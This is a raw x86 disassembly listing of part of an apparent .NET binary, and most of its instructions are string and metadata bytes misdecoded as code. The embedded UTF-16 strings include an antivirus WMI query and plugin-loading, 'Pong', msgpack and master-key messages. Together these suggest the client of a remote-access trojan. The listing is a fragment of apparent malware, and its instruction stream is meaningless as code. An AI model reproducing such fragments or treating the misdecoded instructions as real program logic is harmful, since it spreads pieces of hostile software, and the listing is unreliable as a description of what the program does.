  40c469:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c46d:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c473:	41                   	inc    %ecx
  40c474:	00 6e 00             	add    %ch,0x0(%esi)
  40c477:	74 00                	je     0x40c479
  40c479:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c47f:	72 00                	jb     0x40c481
  40c481:	75 00                	jne    0x40c483
  40c483:	73 00                	jae    0x40c485
  40c485:	00 13                	add    %dl,(%ebx)
  40c487:	49                   	dec    %ecx
  40c488:	00 6e 00             	add    %ch,0x0(%esi)
  40c48b:	73 00                	jae    0x40c48d
  40c48d:	74 00                	je     0x40c48f
  40c48f:	61                   	popa
  40c490:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c494:	00 65 00             	add    %ah,0x0(%ebp)
  40c497:	64 00 00             	add    %al,%fs:(%eax)
  40c49a:	09 50 00             	or     %edx,0x0(%eax)
  40c49d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c49e:	00 6e 00             	add    %ch,0x0(%esi)
  40c4a1:	67 00 00             	add    %al,(%bx,%si)
  40c4a4:	0b 47 00             	or     0x0(%edi),%eax
  40c4a7:	72 00                	jb     0x40c4a9
  40c4a9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4aa:	00 75 00             	add    %dh,0x0(%ebp)
  40c4ad:	70 00                	jo     0x40c4af
  40c4af:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40c4b5:	00 2b                	add    %ch,(%ebx)
  40c4b7:	5c                   	pop    %esp
  40c4b8:	00 72 00             	add    %dh,0x0(%edx)
  40c4bb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4bc:	00 6f 00             	add    %ch,0x0(%edi)
  40c4bf:	74 00                	je     0x40c4c1
  40c4c1:	5c                   	pop    %esp
  40c4c2:	00 53 00             	add    %dl,0x0(%ebx)
  40c4c5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c4c9:	75 00                	jne    0x40c4cb
  40c4cb:	72 00                	jb     0x40c4cd
  40c4cd:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c4d3:	43                   	inc    %ebx
  40c4d4:	00 65 00             	add    %ah,0x0(%ebp)
  40c4d7:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4d8:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c4dc:	00 72 00             	add    %dh,0x0(%edx)
  40c4df:	32 00                	xor    (%eax),%al
  40c4e1:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c4e7:	6c                   	insb   (%dx),%es:(%edi)
  40c4e8:	00 65 00             	add    %ah,0x0(%ebp)
  40c4eb:	63 00                	arpl   %eax,(%eax)
  40c4ed:	74 00                	je     0x40c4ef
  40c4ef:	20 00                	and    %al,(%eax)
  40c4f1:	2a 00                	sub    (%eax),%al
  40c4f3:	20 00                	and    %al,(%eax)
  40c4f5:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c4f9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4fa:	00 6d 00             	add    %ch,0x0(%ebp)
  40c4fd:	20 00                	and    %al,(%eax)
  40c4ff:	41                   	inc    %ecx
  40c500:	00 6e 00             	add    %ch,0x0(%esi)
  40c503:	74 00                	je     0x40c505
  40c505:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c50b:	72 00                	jb     0x40c50d
  40c50d:	75 00                	jne    0x40c50f
  40c50f:	73 00                	jae    0x40c511
  40c511:	50                   	push   %eax
  40c512:	00 72 00             	add    %dh,0x0(%edx)
  40c515:	6f                   	outsl  %ds:(%esi),(%dx)
  40c516:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c51a:	00 63 00             	add    %ah,0x0(%ebx)
  40c51d:	74 00                	je     0x40c51f
  40c51f:	00 17                	add    %dl,(%edi)
  40c521:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c525:	73 00                	jae    0x40c527
  40c527:	70 00                	jo     0x40c529
  40c529:	6c                   	insb   (%dx),%es:(%edi)
  40c52a:	00 61 00             	add    %ah,0x0(%ecx)
  40c52d:	79 00                	jns    0x40c52f
  40c52f:	4e                   	dec    %esi
  40c530:	00 61 00             	add    %ah,0x0(%ecx)
  40c533:	6d                   	insl   (%dx),%es:(%edi)
  40c534:	00 65 00             	add    %ah,0x0(%ebp)
  40c537:	00 07                	add    %al,(%edi)
  40c539:	4e                   	dec    %esi
  40c53a:	00 2f                	add    %ch,(%edi)
  40c53c:	00 41 00             	add    %al,0x0(%ecx)
  40c53f:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c545:	00 13                	add    %dl,(%ebx)
  40c547:	53                   	push   %ebx
  40c548:	00 6f 00             	add    %ch,0x0(%edi)
  40c54b:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c550:	00 61 00             	add    %ah,0x0(%ecx)
  40c553:	72 00                	jb     0x40c555
  40c555:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c55a:	09 70 00             	or     %esi,0x0(%eax)
  40c55d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c55e:	00 6e 00             	add    %ch,0x0(%esi)
  40c561:	67 00 00             	add    %al,(%bx,%si)
  40c564:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c569:	75 00                	jne    0x40c56b
  40c56b:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c56f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c570:	00 00                	add    %al,(%eax)
  40c572:	15 73 00 61 00       	adc    $0x610073,%eax
  40c577:	76 00                	jbe    0x40c579
  40c579:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c57d:	6c                   	insb   (%dx),%es:(%edi)
  40c57e:	00 75 00             	add    %dh,0x0(%ebp)
  40c581:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c585:	6e                   	outsb  %ds:(%esi),(%dx)
  40c586:	00 00                	add    %al,(%eax)
  40c588:	07                   	pop    %es
  40c589:	44                   	inc    %esp
  40c58a:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c58e:	00 00                	add    %al,(%eax)
  40c590:	15 73 00 65 00       	adc    $0x650073,%eax
  40c595:	6e                   	outsb  %ds:(%esi),(%dx)
  40c596:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c59a:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c59e:	00 67 00             	add    %ah,0x0(%edi)
  40c5a1:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c5a7:	48                   	dec    %eax
  40c5a8:	00 61 00             	add    %ah,0x0(%ecx)
  40c5ab:	73 00                	jae    0x40c5ad
  40c5ad:	68 00 65 00 73       	push   $0x73006500
  40c5b2:	00 00                	add    %al,(%eax)
  40c5b4:	09 48 00             	or     %ecx,0x0(%eax)
  40c5b7:	61                   	popa
  40c5b8:	00 73 00             	add    %dh,0x0(%ebx)
  40c5bb:	68 00 00 1b 50       	push   $0x501b0000
  40c5c0:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5c4:	00 67 00             	add    %ah,0x0(%edi)
  40c5c7:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c5cd:	50                   	push   %eax
  40c5ce:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5d2:	00 67 00             	add    %ah,0x0(%edi)
  40c5d5:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c5db:	52                   	push   %edx
  40c5dc:	00 75 00             	add    %dh,0x0(%ebp)
  40c5df:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5e0:	00 00                	add    %al,(%eax)
  40c5e2:	0f 4d 00             	cmovge (%eax),%eax
  40c5e5:	73 00                	jae    0x40c5e7
  40c5e7:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c5eb:	61                   	popa
  40c5ec:	00 63 00             	add    %ah,0x0(%ebx)
  40c5ef:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c5f2:	11 52 00             	adc    %edx,0x0(%edx)
  40c5f5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c5f9:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c5fd:	76 00                	jbe    0x40c5ff
  40c5ff:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c604:	0b 45 00             	or     0x0(%ebp),%eax
  40c607:	72 00                	jb     0x40c609
  40c609:	72 00                	jb     0x40c60b
  40c60b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c60c:	00 72 00             	add    %dh,0x0(%edx)
  40c60f:	00 47 6d             	add    %al,0x6d(%edi)
  40c612:	00 61 00             	add    %ah,0x0(%ecx)
  40c615:	73 00                	jae    0x40c617
  40c617:	74 00                	je     0x40c619
  40c619:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c61d:	4b                   	dec    %ebx
  40c61e:	00 65 00             	add    %ah,0x0(%ebp)
  40c621:	79 00                	jns    0x40c623
  40c623:	20 00                	and    %al,(%eax)
  40c625:	63 00                	arpl   %eax,(%eax)
  40c627:	61                   	popa
  40c628:	00 6e 00             	add    %ch,0x0(%esi)
  40c62b:	20 00                	and    %al,(%eax)
  40c62d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c62e:	00 6f 00             	add    %ch,0x0(%edi)
  40c631:	74 00                	je     0x40c633
  40c633:	20 00                	and    %al,(%eax)
  40c635:	62 00                	bound  %eax,(%eax)
  40c637:	65 00 20             	add    %ah,%gs:(%eax)
  40c63a:	00 6e 00             	add    %ch,0x0(%esi)
  40c63d:	75 00                	jne    0x40c63f
  40c63f:	6c                   	insb   (%dx),%es:(%edi)
  40c640:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c644:	00 6f 00             	add    %ch,0x0(%edi)
  40c647:	72 00                	jb     0x40c649
  40c649:	20 00                	and    %al,(%eax)
  40c64b:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c64f:	70 00                	jo     0x40c651
  40c651:	74 00                	je     0x40c653
  40c653:	79 00                	jns    0x40c655
  40c655:	2e 00 00             	add    %al,%cs:(%eax)
  40c658:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c65d:	70 00                	jo     0x40c65f
  40c65f:	75 00                	jne    0x40c661
  40c661:	74 00                	je     0x40c663
  40c663:	20 00                	and    %al,(%eax)
  40c665:	63 00                	arpl   %eax,(%eax)
  40c667:	61                   	popa
  40c668:	00 6e 00             	add    %ch,0x0(%esi)
  40c66b:	20 00                	and    %al,(%eax)
  40c66d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c66e:	00 6f 00             	add    %ch,0x0(%edi)
  40c671:	74 00                	je     0x40c673
  40c673:	20 00                	and    %al,(%eax)
  40c675:	62 00                	bound  %eax,(%eax)
  40c677:	65 00 20             	add    %ah,%gs:(%eax)
  40c67a:	00 6e 00             	add    %ch,0x0(%esi)
  40c67d:	75 00                	jne    0x40c67f
  40c67f:	6c                   	insb   (%dx),%es:(%edi)
  40c680:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c684:	00 00                	add    %al,(%eax)
  40c686:	55                   	push   %ebp
  40c687:	49                   	dec    %ecx
  40c688:	00 6e 00             	add    %ch,0x0(%esi)
  40c68b:	76 00                	jbe    0x40c68d
  40c68d:	61                   	popa
  40c68e:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c692:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c696:	00 6d 00             	add    %ch,0x0(%ebp)
  40c699:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c69d:	73 00                	jae    0x40c69f
  40c69f:	61                   	popa
  40c6a0:	00 67 00             	add    %ah,0x0(%edi)
  40c6a3:	65 00 20             	add    %ah,%gs:(%eax)
  40c6a6:	00 61 00             	add    %ah,0x0(%ecx)
  40c6a9:	75 00                	jne    0x40c6ab
  40c6ab:	74 00                	je     0x40c6ad
  40c6ad:	68 00 65 00 6e       	push   $0x6e006500
  40c6b2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6b6:	00 63 00             	add    %ah,0x0(%ebx)
  40c6b9:	61                   	popa
  40c6ba:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6be:	00 6f 00             	add    %ch,0x0(%edi)
  40c6c1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6c2:	00 20                	add    %ah,(%eax)
  40c6c4:	00 63 00             	add    %ah,0x0(%ebx)
  40c6c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6c8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c6cc:	00 20                	add    %ah,(%eax)
  40c6ce:	00 28                	add    %ch,(%eax)
  40c6d0:	00 4d 00             	add    %cl,0x0(%ebp)
  40c6d3:	41                   	inc    %ecx
  40c6d4:	00 43 00             	add    %al,0x0(%ebx)
  40c6d7:	29 00                	sub    %eax,(%eax)
  40c6d9:	2e 00 00             	add    %al,%cs:(%eax)
  40c6dc:	05 58 00 32 00       	add    $0x320058,%eax
  40c6e1:	00 0f                	add    %cl,(%edi)
  40c6e3:	7b 00                	jnp    0x40c6e5
  40c6e5:	30 00                	xor    %al,(%eax)
  40c6e7:	3a 00                	cmp    (%eax),%al
  40c6e9:	44                   	inc    %esp
  40c6ea:	00 33                	add    %dh,(%ebx)
  40c6ec:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6ef:	20 00                	and    %al,(%eax)
  40c6f1:	00 0f                	add    %cl,(%edi)
  40c6f3:	7b 00                	jnp    0x40c6f5
  40c6f5:	30 00                	xor    %al,(%eax)
  40c6f7:	3a 00                	cmp    (%eax),%al
  40c6f9:	58                   	pop    %eax
  40c6fa:	00 32                	add    %dh,(%edx)
  40c6fc:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6ff:	20 00                	and    %al,(%eax)
  40c701:	00 2b                	add    %ch,(%ebx)
  40c703:	28 00                	sub    %al,(%eax)
  40c705:	6e                   	outsb  %ds:(%esi),(%dx)
  40c706:	00 65 00             	add    %ah,0x0(%ebp)
  40c709:	76 00                	jbe    0x40c70b
  40c70b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c70f:	20 00                	and    %al,(%eax)
  40c711:	75 00                	jne    0x40c713
  40c713:	73 00                	jae    0x40c715
  40c715:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40c71a:	00 20                	add    %ah,(%eax)
  40c71c:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40c720:	00 70 00             	add    %dh,0x0(%eax)
  40c723:	65 00 20             	add    %ah,%gs:(%eax)
  40c726:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c729:	63 00                	arpl   %eax,(%eax)
  40c72b:	31 00                	xor    %eax,(%eax)
  40c72d:	00 45 28             	add    %al,0x28(%ebp)
  40c730:	00 65 00             	add    %ah,0x0(%ebp)
  40c733:	78 00                	js     0x40c735
  40c735:	74 00                	je     0x40c737
  40c737:	38 00                	cmp    %al,(%eax)
  40c739:	2c 00                	sub    $0x0,%al
  40c73b:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c73f:	74 00                	je     0x40c741
  40c741:	31 00                	xor    %eax,(%eax)
  40c743:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40c747:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c74b:	33 00                	xor    (%eax),%eax
  40c74d:	32 00                	xor    (%eax),%al
  40c74f:	29 00                	sub    %eax,(%eax)
  40c751:	20 00                	and    %al,(%eax)
  40c753:	74 00                	je     0x40c755
  40c755:	79 00                	jns    0x40c757
  40c757:	70 00                	jo     0x40c759
  40c759:	65 00 20             	add    %ah,%gs:(%eax)
  40c75c:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c75f:	63 00                	arpl   %eax,(%eax)
  40c761:	37                   	aaa
  40c762:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c765:	24 00                	and    $0x0,%al
  40c767:	63 00                	arpl   %eax,(%eax)
  40c769:	38 00                	cmp    %al,(%eax)
  40c76b:	2c 00                	sub    $0x0,%al
  40c76d:	24 00                	and    $0x0,%al
  40c76f:	63 00                	arpl   %eax,(%eax)
  40c771:	39 00                	cmp    %eax,(%eax)
  40c773:	00 14 74             	add    %dl,(%esp,%esi,2)
  40c776:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c77a:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c77d:	24 f5                	and    $0xf5,%al
  40c77f:	ac                   	lods   %ds:(%esi),%al
  40c780:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c787:	7a 5c                	jp     0x40c7e5
  40c789:	56                   	push   %esi
  40c78a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c78d:	89 03                	mov    %eax,(%ebx)
  40c78f:	00 00                	add    %al,(%eax)
  40c791:	01 03                	add    %eax,(%ebx)
  40c793:	20 00                	and    %al,(%eax)
  40c795:	01 02                	add    %eax,(%edx)
  40c797:	06                   	push   %es
  40c798:	0e                   	push   %cs
  40c799:	03 06                	add    (%esi),%eax
  40c79b:	12 09                	adc    (%ecx),%cl
  40c79d:	03 06                	add    (%esi),%eax
  40c79f:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c7a3:	00 02                	add    %al,(%edx)
  40c7a5:	03 06                	add    (%esi),%eax
  40c7a7:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c7ad:	03 06                	add    (%esi),%eax
  40c7af:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c7b4:	03 06                	add    (%esi),%eax
  40c7b6:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c7bc:	06                   	push   %es
  40c7bd:	1c 02                	sbb    $0x2,%al
  40c7bf:	06                   	push   %es
  40c7c0:	08 04 00             	or     %al,(%eax,%eax,1)
  40c7c3:	00 12                	add    %dl,(%edx)
  40c7c5:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c7ca:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c7d0:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c7d6:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c7d9:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c7df:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c7e5:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7e8:	01 01                	add    %eax,(%ecx)
  40c7ea:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7ed:	00 12                	add    %dl,(%edx)
  40c7ef:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c7f4:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c7fa:	02 03                	add    (%ebx),%al
  40c7fc:	00 00                	add    %al,(%eax)
  40c7fe:	1c 03                	sbb    $0x3,%al
  40c800:	00 00                	add    %al,(%eax)
  40c802:	08 04 00             	or     %al,(%eax,%eax,1)
  40c805:	01 01                	add    %eax,(%ecx)
  40c807:	08 04 00             	or     %al,(%eax,%eax,1)
  40c80a:	01 02                	add    %eax,(%edx)
  40c80c:	0e                   	push   %cs
  40c80d:	0a 00                	or     (%eax),%al
  40c80f:	04 02                	add    $0x2,%al
  40c811:	1c 12                	sbb    $0x12,%al
  40c813:	19 12                	sbb    %edx,(%edx)
  40c815:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c81a:	01 01                	add    %eax,(%ecx)
  40c81c:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c822:	1c 04                	sbb    $0x4,%al
  40c824:	08 00                	or     %al,(%eax)
  40c826:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c82c:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c82f:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c835:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c838:	00 12                	add    %dl,(%edx)
  40c83a:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c83f:	03 08                	add    (%eax),%ecx
  40c841:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c844:	08 00                	or     %al,(%eax)
  40c846:	08 03                	or     %al,(%ebx)
  40c848:	00 00                	add    %al,(%eax)
  40c84a:	0e                   	push   %cs
  40c84b:	04 00                	add    $0x0,%al
  40c84d:	01 0e                	add    %ecx,(%esi)
  40c84f:	0e                   	push   %cs
  40c850:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c856:	d5 0a                	aad    $0xa
  40c858:	3a 06                	cmp    (%esi),%al
  40c85a:	00 01                	add    %al,(%ecx)
  40c85c:	12 29                	adc    (%ecx),%ch
  40c85e:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c864:	03 00                	add    (%eax),%eax
  40c866:	00 18                	add    %bl,(%eax)
  40c868:	07                   	pop    %es
  40c869:	00 03                	add    %al,(%ebx)
  40c86b:	08 18                	or     %bl,(%eax)
  40c86d:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c873:	18 0e                	sbb    %cl,(%esi)
  40c875:	06                   	push   %es
  40c876:	00 02                	add    %al,(%edx)
  40c878:	02 18                	add    (%eax),%bl
  40c87a:	10 02                	adc    %al,(%edx)
  40c87c:	06                   	push   %es
  40c87d:	00 01                	add    %al,(%ecx)
  40c87f:	11 30                	adc    %esi,(%eax)
  40c881:	11 30                	adc    %esi,(%eax)
  40c883:	06                   	push   %es
  40c884:	00 03                	add    %al,(%ebx)
  40c886:	01 09                	add    %ecx,(%ecx)
  40c888:	09 09                	or     %ecx,(%ecx)
  40c88a:	02 06                	add    (%esi),%al
  40c88c:	09 03                	or     %eax,(%ebx)
  40c88e:	06                   	push   %es
  40c88f:	11 30                	adc    %esi,(%eax)
  40c891:	04 00                	add    $0x0,%al
  40c893:	00 00                	add    %al,(%eax)
  40c895:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c899:	00 00                	add    %al,(%eax)
  40c89b:	04 01                	add    $0x1,%al
  40c89d:	00 00                	add    %al,(%eax)
  40c89f:	00 06                	add    %al,(%esi)
  40c8a1:	00 02                	add    %al,(%edx)
  40c8a3:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c8a6:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c8ab:	0e                   	push   %cs
  40c8ac:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c8b1:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c8b6:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c8bb:	60                   	pusha
  40c8bc:	05 00 01 01 12       	add    $0x12010100,%eax
  40c8c1:	60                   	pusha
  40c8c2:	04 00                	add    $0x0,%al
  40c8c4:	01 01                	add    %eax,(%ecx)
  40c8c6:	0e                   	push   %cs
  40c8c7:	18 06                	sbb    %al,(%esi)
  40c8c9:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c8ce:	12 49 0a             	adc    0xa(%ecx),%cl
  40c8d1:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c8d4:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c8da:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c8df:	0e                   	push   %cs
  40c8e0:	04 20                	add    $0x20,%al
  40c8e2:	00 00                	add    %al,(%eax)
  40c8e4:	00 04 40             	add    %al,(%eax,%eax,2)
  40c8e7:	00 00                	add    %al,(%eax)
  40c8e9:	00 04 10             	add    %al,(%eax,%edx,1)
  40c8ec:	00 00                	add    %al,(%eax)
  40c8ee:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c8f1:	01 01                	add    %eax,(%ecx)
  40c8f3:	0e                   	push   %cs
  40c8f4:	04 20                	add    $0x20,%al
  40c8f6:	01 0e                	add    %ecx,(%esi)
  40c8f8:	0e                   	push   %cs
  40c8f9:	06                   	push   %es
  40c8fa:	20 01                	and    %al,(%ecx)
  40c8fc:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c901:	20 02                	and    %al,(%edx)
  40c903:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c909:	00 01                	add    %al,(%ecx)
  40c90b:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c910:	06                   	push   %es
  40c911:	11 50 03             	adc    %edx,0x3(%eax)
  40c914:	06                   	push   %es
  40c915:	12 55 05             	adc    0x5(%ebp),%dl
  40c918:	00 01                	add    %al,(%ecx)
  40c91a:	0e                   	push   %cs
  40c91b:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c920:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c925:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c92b:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c931:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c937:	01 01                	add    %eax,(%ecx)
  40c939:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c93e:	60                   	pusha
  40c93f:	03 20                	add    (%eax),%esp
  40c941:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c944:	20 00                	and    %al,(%eax)
  40c946:	02 03                	add    (%ebx),%al
  40c948:	28 00                	sub    %al,(%eax)
  40c94a:	1c 03                	sbb    $0x3,%al
  40c94c:	06                   	push   %es
  40c94d:	12 60 0b             	adc    0xb(%eax),%ah
  40c950:	20 02                	and    %al,(%edx)
  40c952:	01 12                	add    %edx,(%edx)
  40c954:	60                   	pusha
  40c955:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c95a:	60                   	pusha
  40c95b:	04 20                	add    $0x20,%al
  40c95d:	00 12                	add    %dl,(%edx)
  40c95f:	60                   	pusha
  40c960:	05 20 01 12 60       	add    $0x60120120,%eax
  40c965:	0e                   	push   %cs
  40c966:	05 20 01 12 60       	add    $0x60120120,%eax
  40c96b:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c971:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c976:	60                   	pusha
  40c977:	08 03                	or     %al,(%ebx)
  40c979:	20 00                	and    %al,(%eax)
  40c97b:	08 05 28 01 12 60    	or     %al,0x60120128
  40c981:	08 03                	or     %al,(%ebx)
  40c983:	28 00                	sub    %al,(%eax)
  40c985:	08 03                	or     %al,(%ebx)
  40c987:	06                   	push   %es
  40c988:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c98c:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c990:	01 08                	add    %ecx,(%eax)
  40c992:	0e                   	push   %cs
  40c993:	05 20 01 01 12       	add    $0x12010120,%eax
  40c998:	61                   	popa
  40c999:	04 20                	add    $0x20,%al
  40c99b:	01 01                	add    %eax,(%ecx)
  40c99d:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c9a0:	01 01                	add    %eax,(%ecx)
  40c9a2:	0b 03                	or     (%ebx),%eax
  40c9a4:	20 00                	and    %al,(%eax)
  40c9a6:	0b 03                	or     (%ebx),%eax
  40c9a8:	20 00                	and    %al,(%eax)
  40c9aa:	0a 03                	or     (%ebx),%al
  40c9ac:	20 00                	and    %al,(%eax)
  40c9ae:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c9b3:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c9b8:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c9bd:	01 0e                	add    %ecx,(%esi)
  40c9bf:	0e                   	push   %cs
  40c9c0:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c9c5:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c9c8:	01 02                	add    %eax,(%edx)
  40c9ca:	0e                   	push   %cs
  40c9cb:	03 20                	add    (%eax),%esp
  40c9cd:	00 0e                	add    %cl,(%esi)
  40c9cf:	04 20                	add    $0x20,%al
  40c9d1:	01 01                	add    %eax,(%ecx)
  40c9d3:	02 04 20             	add    (%eax,%eiz,1),%al
  40c9d6:	01 01                	add    %eax,(%ecx)
  40c9d8:	0c 04                	or     $0x4,%al
  40c9da:	20 01                	and    %al,(%ecx)
  40c9dc:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c9e2:	5c                   	pop    %esp
  40c9e3:	04 20                	add    $0x20,%al
  40c9e5:	00 11                	add    %dl,(%ecx)
  40c9e7:	64 04 20             	fs add $0x20,%al
  40c9ea:	00 12                	add    %dl,(%edx)
  40c9ec:	59                   	pop    %ecx
  40c9ed:	03 28                	add    (%eax),%ebp
  40c9ef:	00 0e                	add    %cl,(%esi)
  40c9f1:	03 28                	add    (%eax),%ebp
  40c9f3:	00 0a                	add    %cl,(%edx)
  40c9f5:	03 28                	add    (%eax),%ebp
  40c9f7:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c9fd:	5c                   	pop    %esp
  40c9fe:	04 28                	add    $0x28,%al
  40ca00:	00 11                	add    %dl,(%ecx)
  40ca02:	64 04 00             	fs add $0x0,%al
  40ca05:	00 00                	add    %al,(%eax)
  40ca07:	00 04 03             	add    %al,(%ebx,%eax,1)
  40ca0a:	00 00                	add    %al,(%eax)
  40ca0c:	00 04 04             	add    %al,(%esp,%eax,1)
  40ca0f:	00 00                	add    %al,(%eax)
  40ca11:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40ca18:	06                   	push   %es
  40ca19:	00 00                	add    %al,(%eax)
  40ca1b:	00 04 07             	add    %al,(%edi,%eax,1)
  40ca1e:	00 00                	add    %al,(%eax)
  40ca20:	00 04 08             	add    %al,(%eax,%ecx,1)
  40ca23:	00 00                	add    %al,(%eax)
  40ca25:	00 04 09             	add    %al,(%ecx,%ecx,1)
